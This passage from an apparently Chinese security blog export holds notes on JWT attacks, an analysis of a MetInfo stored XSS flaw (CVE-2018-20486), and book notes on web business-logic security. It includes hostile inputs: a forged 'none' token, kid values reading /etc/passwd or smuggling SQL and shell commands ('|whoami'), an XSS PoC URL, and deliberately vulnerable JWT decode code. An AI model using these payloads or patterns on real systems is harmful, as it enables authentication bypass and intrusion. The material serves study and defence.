class="string">&quot;&#123;\&quot;typ\&quot;:\&quot;JWT\&quot;,\&quot;alg\&quot;:\&quot;none\&quot;&#125;&quot;</span>) + \</span><br><span class="line">         <span class="string">&#x27;.&#x27;</span> + b64urlencode(<span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;test\&quot;&#125;&quot;</span>) + <span class="string">&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出</span></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjoidGVzdCJ9.</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200417143748.png" alt="20200417143748"></p>
<p>server源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://github.com/Sjord/jwtdemo/blob/master/MishalHS256.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Jwt</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Algorithm</span>\<span class="title">NoneAlgorithm</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Jwt</span>\<span class="title">Algorithm</span>\<span class="title">HS256Algorithm</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MishalHS256</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;algorithms = [</span><br><span class="line">            <span class="string">&#x27;none&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">NoneAlgorithm</span>(),</span><br><span class="line">            <span class="string">&#x27;HS256&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">HS256Algorithm</span>(<span class="string">&#x27;secret&#x27;</span>),</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encodeJwt</span>(<span class="params"><span class="variable">$tokenObj</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Jwt</span>::<span class="title function_ invoke__">encode</span>(<span class="variable">$tokenObj</span>, <span class="variable">$this</span>-&gt;algorithms[<span class="string">&#x27;HS256&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decodeJwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, [<span class="string">&#x27;algorithm&#x27;</span> =&gt; <span class="title function_ invoke__">array_values</span>(<span class="variable">$this</span>-&gt;algorithms)]); <span class="comment"># header部分中指定加密方法为none方法,服务端也用none方法来解密。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>加密方法是读取JWT的header部分吗?</p>
</blockquote>
<hr>
<h2 id="将签名算法从非对称类型改为对称类型"><a href="#将签名算法从非对称类型改为对称类型" class="headerlink" title="将签名算法从非对称类型改为对称类型:"></a>将签名算法从非对称类型改为对称类型:</h2><p>使用非对称加密算法（主要基于RSA、ECDSA，如S256）分发JWT的过程是使用私钥（private）加密生成JWT，使用公钥（public）解密验证。</p>
<p>使用对称加密算法（主要基于HMAC，如HS256）分发JWT的过程是使用同一个密钥（secret）生成和验证JWT。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirebaseRS256</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;private_key = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;private.pem&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;public_key = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;public.pem&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encodeJwt</span>(<span class="params"><span class="variable">$tokenObj</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">encode</span>(<span class="variable">$tokenObj</span>, <span class="variable">$this</span>-&gt;private_key, <span class="string">&#x27;RS256&#x27;</span>); <span class="comment">// 私钥加密作为签名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decodeJwt</span>(<span class="params"><span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Explicitly configured to be vulnerable:</span></span><br><span class="line">        <span class="comment">// we expect a RS256 signature, but also accept a HS256 signature.</span></span><br><span class="line">        <span class="keyword">return</span> JWT::<span class="title function_ invoke__">decode</span>(<span class="variable">$token</span>, <span class="variable">$this</span>-&gt;public_key, [<span class="string">&#x27;RS256&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>]); <span class="comment">// HS256对称加密方式 用公钥作为秘钥</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始的流程是,服务端用私钥加密作为签名，然后用公钥进行验证。</p>
<p>由于我们很难知道私钥，所以我们想自己构造数据的话,没法用相同的私钥签名回去。</p>
<p>但解密时支持<code>HS256</code>这种对称加密方式的话,它只有一个秘钥，如图是公钥。</p>
<p>也就是说我们只要找到公钥,就能篡改数据后,再把数据签名回去，这样能通过延签的部分。</p>
<hr>
<h2 id="HS256（对称加密）密钥破解"><a href="#HS256（对称加密）密钥破解" class="headerlink" title="HS256（对称加密）密钥破解:"></a>HS256（对称加密）密钥破解:</h2><p>如果HS256密钥强度较弱，则可以直接强制使用，通过爆破 HS256的秘钥可以完成该操作。</p>
<p>不过对 JWT 的密钥爆破需要在一定的前提下进行：</p>
<ul>
<li>知悉JWT使用的加密算法</li>
<li>一段有效的、已签名的token</li>
<li>签名用的密钥不复杂（弱密钥）</li>
</ul>
<p>所以其实JWT密钥爆破的局限性很大。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200418113805.png" alt="20200418113805"></p>
<p>可以看到简单的字母数字组合都是可以爆破的，但是密钥位数稍微长一点或者更复杂一点的话，爆破时间就会需要很久。</p>
<hr>
<h2 id="修改KID参数"><a href="#修改KID参数" class="headerlink" title="修改KID参数:"></a>修改KID参数:</h2><p><code>kid</code>是<code>jwt header</code>中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/home/jwt/.ssh/pem&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为该参数可以由用户输入，所以也可能造成一些安全问题。</p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取:"></a>任意文件读取:</h3><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;/etc/passwd&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入:"></a>SQL注入:</h3><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过<code>signature</code>的验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot; : &quot;jwt&quot;,</span><br><span class="line">    &quot;kid&quot; : &quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;/path/to/key_file|whoami&quot;</span><br></pre></td></tr></table></figure>

<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h2><p>与许多其他方面一样，JWT基本上是安全的，但某些实现则不是。</p>
<p>该应用程序可能在JWT中存储敏感信息，允许更改签名算法，或者签名中使用的密钥强度不足、kid参数可控。</p>
<hr>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h2><p>RSA的公钥和私钥区别</p>
<p>公钥和私钥是成对的，它们互相解密。</p>
<p>公钥加密，私钥解密。</p>
<p>私钥数字签名，公钥验证。</p>
<blockquote>
<ul>
<li>A 要给 B 发信息要用 B 的公钥加密，B 用自己的私钥解密。</li>
<li>A 发布了一篇文章，说这是我发的，我用自己的私钥签名了。由于之前 A 已经发布了他的公钥，所以其它人可以用这个公钥去验证。因为知道 A 私钥的只可能是 A 自己。</li>
</ul>
</blockquote>
<p>这样的话：加密是保护数据，签名是核对身份，解决的是不同需求。<br>那么我的理解：不应该是需要解决什么问题就用什么吗？<br>不希望第三方收到内容就加密，不希望第三方冒充发布就签名，或者同时使用。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://www.freebuf.com/articles/web/181261.html">深入了解Json Web Token之实战篇</a></li>
<li><a href="https://github.com/Sjord/jwtdemo">jwtdemo</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/71672282">从SCTF看JWT安全 (附SCTF web writeup)</a></li>
<li><a href="https://xz.aliyun.com/t/6776">攻击JWT的一些方法</a></li>
<li><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">Attacking JWT authentication</a></li>
<li><a href="https://blog.csdn.net/ddonking/article/details/82492206">RSA的公钥和私钥区别</a></li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Metinfo 6.x存储型XSS(CVE-2018-20486) 漏洞分析</title>
    <url>//1900.html</url>
    <content><![CDATA[<h1 id="安装漏洞环境"><a href="#安装漏洞环境" class="headerlink" title="安装漏洞环境:"></a>安装漏洞环境:</h1><p><img src="https://i.loli.net/2019/04/25/5cc1d6ea9ebae.jpg"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现:"></a>漏洞复现:</h1><p>poc:<code>[Host]/admin/login/login_check.php?url_array[]=&lt;script&gt;alert(1)&lt;/script&gt;&amp;url_array[]=a</code></p>
<p>管理员登录后台-安全与效率,触发xss</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6eb902ff.jpg"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h1><h2 id="粗略猜测"><a href="#粗略猜测" class="headerlink" title="粗略猜测:"></a>粗略猜测:</h2><p>引入了外部变量,直接修改了数据库该值<br><img src="https://i.loli.net/2019/04/25/5cc1d6ec922f7.jpg"></p>
<p><code>/MetInfo6.1.3/app/system/safe/admin/index.class.php</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ed68069.jpg"></p>
<p>查询数据库发现被是加密后的字段:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ee20e9c.jpg"></p>
<p>解密后应该就是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<hr>
<h2 id="跟踪分析"><a href="#跟踪分析" class="headerlink" title="跟踪分析:"></a>跟踪分析:</h2><h3 id="common-inc-php"><a href="#common-inc-php" class="headerlink" title="common.inc.php"></a>common.inc.php</h3><p><img src="https://i.loli.net/2019/04/25/5cc1d6ef6f74c.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach(array(&#x27;_COOKIE&#x27;, &#x27;_POST&#x27;, &#x27;_GET&#x27;) as $_request) &#123;</span><br><span class="line">	foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;0&#125; != &#x27;_&#x27; &amp;&amp; $$_key = daddslashes($_value,0,0,1);</span><br><span class="line">		$_M[&#x27;form&#x27;][$_key]=daddslashes($_value,0,0,1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候,引入了外部变量<code>_COOKIE</code>,<code>_POST</code>, <code>_GET</code></p>
<p>这个循环会遍历全局变量<code>_COOKIE</code>,<code>_POST</code>, <code>_GET</code>，然后对里面的值进行过滤,然后赋值到<code>$_M[form]</code></p>
<p>进入循环之前,<code>$_M</code>变量的值为</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f01e788.jpg"></p>
<p>结束循环时,出现了变量覆盖,<code>$_M</code>变量的值为</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f0e6c11.jpg"></p>
<blockquote>
<p>code mix with data.</p>
</blockquote>
<h3 id="login-check-php"><a href="#login-check-php" class="headerlink" title="login_check.php"></a>login_check.php</h3><p><img src="https://i.loli.net/2019/04/25/5cc1d6f2717ec.jpg"></p>
<p>payload经过<code>authcode</code>函数加密后.更新入了表<code>met_config</code>里的<code>met_adminfile</code>字段</p>
<hr>
<p>攻击者将payload注入到数据库后,管理员访问后台的安全与效率,触发xss时发生了什么?</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>load_class.php</code> 加载模块</p>
<p>加载了<code>app/system/index/admin/</code>下的<code>index</code> 类,调用里面的<code>doindex</code>函数</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f434e32.jpg"></p>
<p><code>index</code> 类继承了 <code>admin</code>类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> <span class="keyword">extends</span> <span class="title">admin</span></span></span><br></pre></td></tr></table></figure>

<p><code>admin</code> 类继承了 <code>common</code>类</p>
<h3 id="common-class-php"><a href="#common-class-php" class="headerlink" title="common.class.php"></a>common.class.php</h3><p><code>common</code>类 构造函数里面,加载了全站的配置数据</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0ehqbi24wj30u00iatgb.jpg"></p>
<p>load_config_global函数,先读取了数据库的配置到<code>$M</code>全局数组中,</p>
<p>此时的<code>met_adminfile</code>还没解密<br><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0ehy76stbj31aq0f87dx.jpg"></p>
<p>经过<code>authcode</code>解密函数后,<br><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0ehzt6b3ij323s09kk3c.jpg"></p>
<p>可以看到<code>met_adminfile</code>就是我们的payload<br><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ei0nueppj30nc0ee7ah.jpg"></p>
<h3 id="admin-class-php"><a href="#admin-class-php" class="headerlink" title="admin.class.php"></a>admin.class.php</h3><p>执行<code>check()</code>函数:</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0ei492hgej31iu0geqd7.jpg"></p>
<p>将$M全局数组里的值赋给了<code>$met_adminfile</code></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ei5dwdf4j32580e04mv.jpg"></p>
<h3 id="加载页面"><a href="#加载页面" class="headerlink" title="加载页面:"></a>加载页面:</h3><p>先加载渲染了侧边栏、头部底部之后,最后才加载渲染<code>/app/system/safe/admin/index.class.php</code></p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0eiv8ks2vj328p0u0e81.jpg"></p>
<hr>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h2><ul>
<li><code>login_check.php</code> 10行 包含了<code>../include/common.inc.php</code></li>
</ul>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0egz5zgcwj30h600qaah.jpg"></p>
<ul>
<li><code>common.inc.php</code> 79-84行,循环赋值给<code>$M</code>数组时产生了变量覆盖</li>
</ul>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0egzvve8tj3102068791.jpg"></p>
<ul>
<li><code>login_check.php</code> 13-18行,将payload加密后更新入了表<code>met_config</code>里的<code>met_adminfile</code>字段</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0eh167azuj327e05w124.jpg"></p>
<hr>
<h1 id="others"><a href="#others" class="headerlink" title="others:"></a>others:</h1><p>造成变量覆盖时使用的语法.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hell</span>=<span class="string">&quot;abc&quot;</span>; <span class="variable">$$hell</span>=<span class="string">&quot;def&quot;</span>;等同于<span class="variable">$abc</span>=<span class="string">&quot;def&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_request</span> = _GET</span><br><span class="line"><span class="variable">$$_request</span> = <span class="variable">$_GET</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>这是个trick?</p>
</blockquote>
<hr>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考:"></a>思考:</h1><ul>
<li>善用搜索,加对断点可以加快跟踪调试的速度</li>
<li>一开始粗略猜测,可以知道大体的思路</li>
<li>对前端页面进行元素查看,也可以方便加断点,加快速度</li>
</ul>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://blog.csdn.net/dl425134845/article/details/49616557">php下session_cache_limiter(private,must-revalidate)–表单填写内容不丢失</a></li>
<li><a href="https://www.anquanke.com/post/id/169456">Metinfo 6.x存储型XSS分析（CVE-2018-20486）</a></li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Web安全防护指南基础篇</title>
    <url>//4272.html</url>
    <content><![CDATA[<h1 id="第三部分-业务逻辑安全"><a href="#第三部分-业务逻辑安全" class="headerlink" title="第三部分 业务逻辑安全"></a>第三部分 业务逻辑安全</h1><blockquote>
<p>功能有很多，这些功能执行的前提是用户需要登录系统，并获得用户权限。<br>业务功能有很多种，并且每个网站的应用流程不同（如京东与淘宝的支付流程完全不同），用户业务的开展及应用体验均基于Web应用实现。</p>
</blockquote>
<blockquote>
<p>原有用户管理组件设计的缺陷导致它们极易受到来自外部的恶意攻击，实现对其他用户权限\信息的获取，进而导致更严重的后果。</p>
</blockquote>
<h2 id="第9章-业务逻辑安全风险存在的前提"><a href="#第9章-业务逻辑安全风险存在的前提" class="headerlink" title="第9章 业务逻辑安全风险存在的前提"></a>第9章 业务逻辑安全风险存在的前提</h2><blockquote>
<p>业务逻辑实现的前提是：要有效区分每个用户，针对每个用户提供独立的服务内容，并且允许客户与服务器进行大量交互。</p>
</blockquote>
<blockquote>
<p>如果把一个网站比喻成一个银行，那么用户权限就相当于银行中每个人能活动的区域。例如，银行工作人员可以在银行柜台内部、办公区活动，并进行相应工作；而对于来到银行办理业务的顾客，其活动区域就是银行公共区域，也就是柜台外面。可见，银行工作人员的权限比顾客高，因为其活动区域大，同时活动涉及银行业务的正常开展。那么，如果顾客的权限与工作人员一样，会产生什么后果？结果是顾客也能随意出入银行内部，翻看经营报表，随意办理业务等，必然会对银行的正常运营造成极大影响，并且对资金安全产生直接威胁。通过这个例子可知，做出有效的权限划分是极其必要的</p>
</blockquote>
<blockquote>
<p>在Web应用场景下，一个网站也会涉及多种用户身份：游客、普通用户、VIP用户、客服人员、业务主管、网站管理员等。每类用户都会对网站正常工作带来影响。这就要求网站的运营者必须对网站的各类用户进行权限划分，方可实现网站的正常运营，避免产生混乱。</p>
</blockquote>
<blockquote>
<p>针对Web应用的攻击就是一个从零权限到最高权限的过程。攻击者在初始状态下没有任何权限（可理解为与网站无任何交集）。如果能获取最高权限（通常为网站管理员权限，可操作网站的全部功能），就相当于取得了网站的管理权限。同理，如果攻击者退而求其次，只取得某一个用户权限，那么攻击者就可以利用这个用户的身份开展相关业务，如转账、购买物品等。总之，攻击者的核心目标就是通过各种手段提升自己的权限。权限越大，对后续的攻击越有帮助</p>
</blockquote>
<blockquote>
<p>假设网站对权限管理不足，就会造成平行越权的情况。例如，A、B两人的账户均为普通用户。若登录A账户后可通过修改参数方式，冒充B账户获得相关信息或开展业务，这就是平行越权</p>
</blockquote>
<blockquote>
<p>核心问题是对权限的逻辑进行攻击</p>
</blockquote>
<blockquote>
<p>权限过于细化也容易给网站管理带来不便。为了解决这个问题，通常建议从多个角度进行划分，即分层管理权限。</p>
</blockquote>
<blockquote>
<p>可利用分权管理作为分类管理的延续。</p>
</blockquote>
<blockquote>
<p>用户管理的本质是权限管理</p>
</blockquote>
<blockquote>
<p>可见，用户管理涉及Web应用的所有权限点，并且每个步骤都涉及权限的提升、修改、删除等。每项功能都在一定程度上影响着用户账户安全，决定着当前用户账户的安全程度。</p>
</blockquote>
<p>某个数据包里的某个参数就会引起问题</p>
<blockquote>
<p>例如，对于用户注册功能，需要用户打开注册页面、填写个人信息、提交表单，某些站点还需要用户进行短信或邮件验证。这个过程中，只要有任意一个环境出现判断偏差</p>
</blockquote>
<blockquote>
<p>例如，对于用户注册功能，需要用户打开注册页面、填写个人信息、提交表单，某些站点还需要用户进行短信或邮件验证。这个过程中，只要有任意一个环境出现判断偏差</p>
</blockquote>
<h2 id="第10章-用户管理功能的实现"><a href="#第10章-用户管理功能的实现" class="headerlink" title="第10章 用户管理功能的实现"></a>第10章 用户管理功能的实现</h2><blockquote>
<p>由于HTTP协议的无状态特性，导致用户每次访问网站页面时，Web服务器不知道用户的本次访问与上次访问有什么关联。从用户角度来说，如果在一个网站中，每次打开新页面均需输入用户名&#x2F;密码，那么用户体验将非常差。因此Web系统在开发过程中需引入客户端的保持方案，使服务器在一定时间内对连接到Web服务器的客户端进行识别。目前，客户端保持方案主要采用的技术为Cookie和Session两种方式。</p>
</blockquote>
<blockquote>
<p>Cookie采用的是在客户端保持状态的方案，而Session采用的是在服务器端保持状态的方案。在真实环境中，两种客户端的保持方式会共存。</p>
</blockquote>
<blockquote>
<p>HTTP协议的无状态是指协议对于事务处理没有记忆能力。这意味着如果后续处理需要前面的信息，则必须重传之前的信息，从而导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时，则应答速度就较快。</p>
</blockquote>
<blockquote>
<p>客户端与服务器进行动态交互的Web应用程序（典型的应用场景为在线商店、BBS等）出现之后，HTTP无状态的特性严重阻碍了这些应用程序的功能实现，因为这些交互需要知道前后操作的关联，并且每个用户必须拥有独立的交互环境。</p>
</blockquote>
<blockquote>
<p>总体来说，Cookie与Session实现了针对客户端的保持状态。通过上述两种技术，服务器就知道了它在给谁服务。</p>
</blockquote>
<blockquote>
<p>绝大部分Web应用系统采用Web中间件+数据库的模式运行。通过Web服务器对用户提出的申请进行识别，并自动连接数据库，在数据库中添加或查询相关信息，即可实现此类功能。</p>
</blockquote>
<blockquote>
<p>服务器在对用户登录请求进行校验并通过后，生成唯一的Cookie并发送给用户，之后用户在此网站中执行任意点击功能，浏览器均会将服务器生成的Cookie一并发送，从而达到区分用户的目的</p>
</blockquote>
<blockquote>
<p>Cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的。</p>
</blockquote>
<blockquote>
<p>浏览器检查所有存储的Cookie，如果某个Cookie所声明的作用范围大于等于将要请求的资源所在的位置，则把该Cookie附在请求资源的HTTP请求头上发送给服务</p>
</blockquote>
<blockquote>
<p>Cookie的内容主要包括名字、内容、创建时间、过期时间、路径和域。路径与域一起构成Cookie的作用范围。若不设置过期时间，则表示这个Cookie的生命期为浏览器会话期间，关闭浏览器窗口时，Cookie消失。这种生命期为浏览器会话期的Cookie称为会话Cookie。若设置了过期时间，浏览器就会把Cookie保存到硬盘上，关闭后再次打开浏览器，这些Cookie仍然有效，直到超过设定的过期时间。存储在硬盘上的Cookie可以在不同的浏览器进程间共享，比如在两个IE窗口间共享，方便用户进行多窗口操作，也为网站设计带来方便</p>
</blockquote>
<blockquote>
<p>同源策略（Same Origin Policy, SOP）的主要目的在于区分不同站点的Cookie信息，避免不同站点的Cookie信息交互，导致用户信息的泄漏。</p>
</blockquote>
<blockquote>
<p>这主要是由于Cookie由客户端保存，攻击者可以利用这种特性，完全修改Cookie的内容，达到欺骗目标服务器的效果。这种情况下，仅通过Cookie无法阻止攻击者的各类仿冒攻击，因此，还需引入Session来解决此问题。</p>
</blockquote>
<blockquote>
<p>如果用户名和密码存储在数据库，那么每次请求都要查询一次数据库，给数据库造成很大负担，同时在用户访问一个新页面或开展一项新业务还需重新登录，这样的环境对用户而言极不方便，甚至会放弃使用当前站点。</p>
</blockquote>
<blockquote>
<p>Session的实现原理与Cookie有非常大的不同。Session内容存储在服务器端，远程用户无法直接修改Session文件的内容，因此可以只存储一个admin变量来判断用户是否登录，首次验证通过后设置“admin”值为true，以后判断该值是否为true。</p>
</blockquote>
<blockquote>
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息</p>
</blockquote>
<blockquote>
<p>当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中寻找和这个Session ID同名的Session文件，将之前为这个用户保存的会话信息读出，并在当前脚本中应用，达到跟踪用户的目的。Session以数组的形式使用，如$_SESSION[‘Session名’]。</p>
</blockquote>
<blockquote>
<p>通常情况下，Cookie与Session同时使用。如果仅利用Cookie，在一些场景下也能有效实现用户的身份保持方式。</p>
</blockquote>
<blockquote>
<p>整体情况下，WordPress使用Cookie来验证用户身份，并且根据用户的使用权限，将Cookie分为登录用户Cookie和评论人Cookie。</p>
</blockquote>
<blockquote>
<p>总体来说，WordPress的站点主要有用户登录、发布文章、评论等功能，功能较为单一。因此利用Cookie方法可满足现有要求。这里分析WrodPress的目的在于理解Cookie的具体实现方式，并且能说明技术的使用没有绝对性，能满足实际的需求才是技术的根本目的。</p>
</blockquote>
<blockquote>
<p>因此，AJAX可实现局部功能请求及刷新，从而有效避免其他重复内容的变更，节省服务器及带宽资源，并提升用户体验。当然，在这个过程中，AJAX在后台判断，然后向前台返回结果，这也是信任前台的处理过程</p>
</blockquote>
<blockquote>
<p>AJAX有个显著特点，就是判断机制在客户端执行，这样就可能产生极大的安全隐患。具体执行方式为：攻击者可截获服务器的response包，并修改其中的信息，进而实现欺骗客户端的判断机制，并绕过用户登录验证。</p>
</blockquote>
<blockquote>
<p>当然，如果只修改返回包的数据，并欺骗判断机制，有时并不能成功。这主要取决于服务器端是如何实现Session生成及管理机制。</p>
</blockquote>
<blockquote>
<p>业务流程的安全隐患与基础漏洞有非常大的不同，主要表现在漏洞利用方式上，因此需要从业务流程设计角度进行考虑，从而更好地理解漏洞原理及处理方法。</p>
</blockquote>
<h2 id="第11章-用户授权管理及安全分析"><a href="#第11章-用户授权管理及安全分析" class="headerlink" title="第11章 用户授权管理及安全分析"></a>第11章 用户授权管理及安全分析</h2><blockquote>
<p>用户授权管理是指用户在未获得任何网站的用户权限时，用户可实现对自己的身份的注册，并根据用户的私有信息（用户名&#x2F;密码）等进行成功登录，之后根据用户登录成功信息合理开展后续业务。登录过程即为获得网站对应此用户的权限</p>
</blockquote>
<blockquote>
<p>用户第一次访问目标站点时，从这个网站的权限管理角度来看，该用户的权限为零，只有公共页面浏览权限。如果用户需要开展业务，则需先进行账户注册，再利用注册成功的用户名及密码登录网站。</p>
</blockquote>
<blockquote>
<p>所有的Web系统应用都是获得用户权限之后才能开展工作，因此，用户权限管理的安全直接关系到整体系统的业务体系安全性</p>
</blockquote>
<blockquote>
<p>但是这个流程中存在哪些安全隐患呢？<br>1）没有用户验证过程，如果注册用户与现有用户重复，可能会覆盖现有用户。<br>2）没有对用户输入数据进行校验，易出现空格覆盖、万能密码绕过等隐患。<br>3）没有注册申请数量限制，可能会被批量注册。</p>
</blockquote>
<blockquote>
<p>因此，标准的用户注册功能应为：用户提交注册表单→服务器验证用户名是否可用→对用户数据进行校验→创建数据库数据→服务器接受数据库返回值→告知用户注册成功或失败。</p>
</blockquote>
<blockquote>
<p>重复注册是指用户在注册过程中，对同样的信息进行多次提交。如果服务器没有业务重复检测机制，就会对用户多次提交的相同信息进行处理，导致后台数据增多、用户权限混乱等问题的出现。</p>
</blockquote>
<blockquote>
